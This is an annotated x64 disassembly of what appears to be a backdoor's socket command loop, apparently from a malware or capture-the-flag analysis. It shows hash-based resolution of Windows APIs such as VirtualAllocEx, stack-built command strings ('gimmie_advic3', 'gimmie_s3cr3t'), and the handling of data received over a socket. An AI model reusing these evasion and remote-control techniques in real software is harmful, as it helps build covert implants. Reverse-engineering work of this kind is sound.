loc_18004E0E7: mov     [rsp+8], rcx
loc_1800208CA: sub     rsp, 88h
loc_180053E0B: mov     dword ptr [rsp+38h], 0
loc_18005D304: mov     byte ptr [rsp+48h], 67h
loc_18000CE08: mov     byte ptr [rsp+49h], 69h
loc_18002BE77: mov     byte ptr [rsp+4Ah], 6Dh
loc_180057FE1: mov     byte ptr [rsp+4Bh], 6Dh
loc_1800222AA: mov     byte ptr [rsp+4Ch], 69h
loc_18000B2A1: mov     byte ptr [rsp+4Dh], 65h
loc_180024667: mov     byte ptr [rsp+4Eh], 5Fh
loc_18003036C: mov     byte ptr [rsp+4Fh], 61h
loc_18005C82C: mov     byte ptr [rsp+50h], 64h
loc_18001CC92: mov     byte ptr [rsp+51h], 76h
loc_1800069A1: mov     byte ptr [rsp+52h], 69h
loc_180027A78: mov     byte ptr [rsp+53h], 63h
loc_180023102: mov     byte ptr [rsp+54h], 33h
loc_18002476B: mov     byte ptr [rsp+55h], 0
loc_180064126: mov     byte ptr [rsp+58h], 67h
loc_1800612C7: mov     byte ptr [rsp+59h], 69h
loc_18000A78F: mov     byte ptr [rsp+5Ah], 6Dh
loc_18003701C: mov     byte ptr [rsp+5Bh], 6Dh
loc_180023E3D: mov     byte ptr [rsp+5Ch], 69h
loc_180027A63: mov     byte ptr [rsp+5Dh], 65h
loc_18001683F: mov     byte ptr [rsp+5Eh], 5Fh
loc_1800365F0: mov     byte ptr [rsp+5Fh], 73h
loc_1800255D3: mov     byte ptr [rsp+60h], 33h
loc_1800287FF: mov     byte ptr [rsp+61h], 63h
loc_18001F7D0: mov     byte ptr [rsp+62h], 72h
loc_180050312: mov     byte ptr [rsp+63h], 33h
loc_18004F5C4: mov     byte ptr [rsp+64h], 74h
loc_18002CA74: mov     byte ptr [rsp+65h], 0
loc_18003FBD6: mov     byte ptr [rsp+34h], 0Dh
loc_18004106B: mov     byte ptr [rsp+35h], 0Ah
loc_18000706A: call    near ptr unk_180040069
loc_18001F177: mov     [rsp+70h], rax
loc_180016DB7: mov     dword ptr [rsp+78h], 0
loc_18005C4AA: mov     byte ptr [rsp+32h], 20h
loc_18000E613: mov     byte ptr [rsp+30h], 0Dh
loc_18001274F: mov     byte ptr [rsp+31h], 0Ah
loc_18002C5D9: cmp     qword ptr [rsp+70h], 0
loc_18004FBD7: jnz     near ptr unk_18002DE42
loc_180044D21: mov     rcx, [rsp+90h]
loc_180003963: call    near ptr unk_18001B746 ; "goodbye" function (close socket and handles)
loc_18002DE42: mov     r9d, 4
loc_1800616FE: mov     r8d, 1000h
loc_180056666: mov     edx, 4000h
loc_18001DB49: xor     ecx, ecx
loc_180009446: push    r15
loc_180026FB8: push    r14
loc_180006DA4: xor     r14, r14
loc_180025DFB: mov     r15d, 0E553A458h ; VirtualAllocEx
loc_1800514E6: call    near ptr unk_180014D24 ; "execute" function (r15=winAPI function hash)
loc_180021AF1: add     rsp, 20h
loc_180058FC1: pop     r14
loc_180023906: pop     r15
loc_180042627: mov     [rsp+40h], rax
loc_1800473DC: cmp     qword ptr [rsp+40h], 0
loc_18005B5CC: jnz     near ptr unk_180062ACC
loc_180005111: mov     rcx, [rsp+90h]
loc_1800648A5: call    near ptr unk_18001B746 ; "goodbye" function (close socket and handles)
loc_180062ACC: xor     eax, eax
loc_18003E476: cmp     eax, 1
loc_18003502E: jz      near ptr unk_18000544F
loc_18004B749: mov     r8d, 4000h
loc_18004A93B: xor     edx, edx
loc_18004E426: mov     rcx, [rsp+40h]
loc_18001B0C9: call    near ptr unk_1800445AD ; memset (rcx=buf, rdx=val, r8=size)
loc_180061CF8: mov     r8d, 4000h
loc_18000120F: xor     edx, edx
loc_1800658B8: mov     rax, [rsp+90h]
loc_18000F757: mov     rcx, [rax+30h]
loc_18003EC1A: call    near ptr unk_1800445AD ; memset (rcx=buf, rdx=val, r8=size)
loc_180002E15: xor     r9d, r9d
loc_180010A10: mov     r8d, 4000h
loc_180042F35: mov     rax, [rsp+90h]
loc_18002353B: mov     rdx, [rax+30h]
loc_1800171AC: mov     rax, [rsp+90h]
loc_18004CE9E: mov     rcx, [rax+8]
loc_180065BFD: call    near ptr unk_18000CB82 ; recv
loc_18000D61D: mov     [rsp+6Ch], eax
loc_180018708: cmp     dword ptr [rsp+6Ch], 0
loc_180014CD6: ja      near ptr unk_180065758
loc_180057FFD: mov     rcx, [rsp+90h]
loc_180059D7C: call    near ptr unk_18001B746 ; "goodbye" function (close socket and handles)
loc_180065758: mov     r8d, 4000h
loc_180042990: mov     rax, [rsp+90h]
loc_18001296A: mov     rdx, [rax+30h]
loc_180057AE3: mov     rcx, [rsp+40h]
loc_180060193: call    near ptr unk_180001923 ; memcpy
loc_180032A9E: movzx   edx, byte ptr [rsp+30h]
loc_18005B3AA: mov     rcx, [rsp+40h]
loc_180049359: call    near ptr unk_18001C6DC ; remove character from string
loc_18002FF32: movzx   edx, byte ptr [rsp+31h]
loc_18002830A: mov     rcx, [rsp+40h]
loc_18004978E: call    near ptr unk_18001C6DC ; remove character from string
loc_18005F7C7: movzx   edx, byte ptr [rsp+32h]
loc_18005CED3: mov     rcx, [rsp+40h]
loc_180032B1A: call    near ptr unk_18001C6DC ; remove character from string
loc_180048911: lea     rdx, [rsp+48h]
loc_18005FD69: mov     rcx, [rsp+40h]
loc_1800524E8: call    near ptr unk_1800374EF ; strcmp
loc_1800552FB: test    eax, eax
loc_18000E353: jnz     near ptr unk_18001D66A
loc_18005AE29: lea     rdx, [rsp+78h]
loc_18004317E: mov     rcx, [rsp+90h]
loc_1800454A5: call    near ptr unk_18003C5E2 ; "advice"
loc_18005B45E: mov     qword ptr [rsp+20h], 0
loc_18000949A: lea     r9, [rsp+38h]
loc_180060416: mov     r8d, 2
loc_18005671C: lea     rdx, [rsp+34h]
loc_18000648D: mov     rax, [rsp+90h]
loc_180002187: mov     rcx, [rax+20h]
loc_180063A6B: call    qword ptr [rsp+70h]
loc_180065DF2: mov     [rsp+68h], eax
loc_1800444AF: jmp     near ptr unk_180014DAF
loc_180014DAF: jmp     loc_180062ACC
loc_18001D66A: lea     rdx, [rsp+58h]
loc_180044E73: mov     rcx, [rsp+40h]
loc_180035003: call    near ptr unk_1800374EF ; strcmp
loc_180001805: test    eax, eax
loc_180059C26: jnz     near ptr unk_18001451B
loc_180025149: mov     rcx, [rsp+90h]
loc_18001B978: call    near ptr unk_1800216F6 ; "secret"
loc_18002256B: mov     qword ptr [rsp+20h], 0
loc_180007D1A: lea     r9, [rsp+38h]
loc_18002AA54: mov     r8d, 2
loc_18000B1F2: lea     rdx, [rsp+34h]
loc_1800502C0: mov     rax, [rsp+90h]
loc_18002F20E: mov     rcx, [rax+20h]
loc_1800171FE: call    qword ptr [rsp+70h]
loc_180023D88: mov     [rsp+68h], eax
loc_180046051: jmp     loc_180014DAF
loc_18001451B: mov     qword ptr [rsp+20h], 0
loc_180057962: lea     r9, [rsp+38h]
loc_18005CA18: mov     r8d, [rsp+6Ch]
loc_18002BFFF: mov     rax, [rsp+90h]
loc_18004EA21: mov     rdx, [rax+30h]
loc_18003C848: mov     rax, [rsp+90h]
loc_18005A5A2: mov     rcx, [rax+20h]
loc_1800312B5: call    qword ptr [rsp+70h]
loc_180017A44: mov     [rsp+68h], eax
loc_18002594F: cmp     dword ptr [rsp+68h], 0
loc_18000808F: jz      near ptr unk_18003A424
loc_1800430F1: cmp     dword ptr [rsp+38h], 0
loc_18003A7ED: jnz     loc_180014DAF
loc_18003A424: mov     rcx, [rsp+90h]
loc_180033747: call    near ptr unk_18001B746 ; "goodbye" function (close socket and handles)
loc_18000544F: mov     r8d, 8000h
loc_180036B20: xor     edx, edx
loc_1800408ED: mov     rcx, [rsp+40h]
loc_18003F907: push    r15
loc_18003E7E5: push    r14
loc_18003FEBD: xor     r14, r14
loc_180012857: mov     r15d, 300F2F0Bh ; VirtualFree
loc_18005D035: call    near ptr unk_180014D24 ; "execute" function (r15=winAPI function hash)
loc_180022F67: add     rsp, 20h
loc_18002C8B7: pop     r14
loc_180029E87: pop     r15
loc_180008AAA: xor     eax, eax
loc_18000A97A: add     rsp, 88h
loc_1800626D9: retn